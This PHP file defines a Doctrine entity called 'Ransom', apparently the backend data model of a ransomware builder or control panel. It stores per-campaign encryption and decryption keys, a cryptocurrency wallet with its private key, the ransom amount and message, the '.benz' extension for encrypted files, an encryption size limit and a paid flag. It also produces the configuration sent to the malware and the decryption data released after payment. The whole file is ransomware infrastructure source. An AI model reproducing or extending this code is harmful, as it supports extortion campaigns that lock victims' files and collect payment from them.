<?php

namespace SmallPHP\Models;

require_once __DIR__ . "/../utils/guid.php";
require_once __DIR__ . "/executable/executable.php";

use Doctrine\ORM\Mapping\Id;
use Doctrine\ORM\Mapping\GeneratedValue;
use Doctrine\ORM\Mapping\JoinColumn;
use Doctrine\ORM\Mapping\OneToOne;
use Doctrine\ORM\Mapping\Column;
use Doctrine\ORM\Mapping\Entity;
use Doctrine\ORM\Mapping\MappedSuperclass;
use Doctrine\ORM\Mapping\Table;

use function SmallPHP\GUID\create_guid;

/**
 * @Entity
 * @MappedSuperclass
 * @Table(name="Ransom")
 */
class Ransom
{
    /**
     * @var string $id
     * @Id
     * @Column(name="id", type="string")
     */
    private string $id;

    /**
     * @var string|null $name
     * @Column(name="name", type="string", nullable=true)
     */
    private ?string $name;

    /**
     * @var string $description
     * @Column(name="description", type="string")
     */
    private string $description;

    /**
     * @var boolean $paid
     * @Column(name="paid", type="boolean")
     */
    private bool $paid;

    /**
     * @var boolean $active
     * @Column(name="active", type="boolean")
     */
    private bool $active;

    /**
     * @var Cipher $cipher
     * @OneToOne(targetEntity="Cipher", cascade={"persist"})
     * @JoinColumn(name="cipher_id", referencedColumnName="id")
     */
    private Cipher $cipher;

    /**
     * @var CryptoAddress $crypto_account
     * @OneToOne(targetEntity="CryptoAddress", cascade={"persist"})
     * @JoinColumn(name="crypto_account_id", referencedColumnName="id")
     */
    private CryptoAddress $crypto_account;

    /**
     * @var int $max_encrypt
     * @Column(name="max_encrypt", type="integer")
     */
    private int $max_encrypt;

    /**
     * @var string $extension
     * @Column(name="extension", type="string")
     */
    private string $extension;

    /**
     * @var float $crypto_amount
     * @Column(name="crypto_amount", type="float")
     */
    private float $crypto_amount;

    /**
     * @var string $message
     * @Column(name="message", type="string")
     */
    private string $message;

    /**
     * @var array $executables
     * @ManyToMany(targetEntity="Executable", inversedBy="", cascade={"delete"})
     */
    private array $executables;

    public function __construct(CryptoAddress $crypto_account, Cipher $cipher)
    {
        $this->cipher = $cipher;
        $this->crypto_account = $crypto_account;
        $this->id = create_guid();
        $this->name = $this->id;

        $this->max_encrypt = 4194304; // 4MB
        $this->extension = ".benz";
        $this->paid = false;
        $this->active = false;
    }

    public function add_executable(Executable $executable): void
    {
        $this->executables[] = $executable;
    }

    public function get_executables(): array
    {
        return $this->executables;
    }

    public function set_active(bool $active)
    {
        $this->active = $active;
    }

    public function get_id(): string
    {
        return $this->id;
    }

    public function set_name(?string $name)
    {
        $this->name = $name;
    }

    public function get_cipher(): Cipher
    {
        return $this->cipher;
    }

    public function get_crypto_account(): CryptoAddress
    {
        return $this->crypto_account;
    }

    public function set_ransom_amount(float $amount): void
    {
        $this->crypto_amount = $amount;
    }

    public function set_message(string $message): void
    {
        $this->message = $message;
    }

    public function set_description(string $description): void
    {
        $this->description = $description;
    }

    public function to_array(): array
    {
        return [
            "id" => $this->id,
            "encryptKey" => $this->cipher->get_encryption_key(),
            "cipherType" => $this->cipher->get_type(),
            "cryptoAddress" => $this->crypto_account->get_address(),
            "cryptoAmount" => $this->crypto_amount,
            "cryptoType" => $this->crypto_account->get_type(),
            "message" => $this->message,
            "extension" => $this->extension,
            "maxEncrypt" => $this->max_encrypt,
            "name" => $this->name,
            "description" => $this->description,
            "paid" => $this->paid,
            "active" => $this->active
        ];
    }

    public function encrypt_json(): string
    {
        return json_encode($this->to_array());
    }

    public function to_full_array(): array
    {
        return [
            "id" => $this->id,
            "name" => $this->name,
            "description" => $this->description,
            "paid" => $this->paid,
            "active" => $this->active,

            "encryptKey" => $this->cipher->get_encryption_key(),
            "cipherType" => $this->cipher->get_type(),
            "decryptKey" => $this->cipher->get_decryption_key(),

            "cryptoType" => $this->crypto_account->get_type(),
            "cryptoAddress" => $this->crypto_account->get_address(),
            "cryptoPrivateKey" => $this->crypto_account->get_private_key(),
            "cryptoPublicKey" => $this->crypto_account->get_public_key(),
            "cryptoAmount" => $this->crypto_amount,

            "message" => $this->message,
            "extension" => $this->extension,
            "maxEncrypt" => $this->max_encrypt
        ];
    }

    public function decrypt_json(): string
    {
        return json_encode([
            "id" => $this->id,
            "message" => $this->message,
            "decryptKey" => $this->cipher->get_decryption_key(),
            "cipherType" => $this->cipher->get_type()
        ]);
    }

    public function set_paid(bool $paid)
    {
        $this->paid = $paid;
    }

    public function set_max_encrypt(int $max_encrypt)
    {
        $this->max_encrypt = $max_encrypt;
    }

    public function set_extension(string $extension)
    {
        $this->extension = $extension;
    }
}
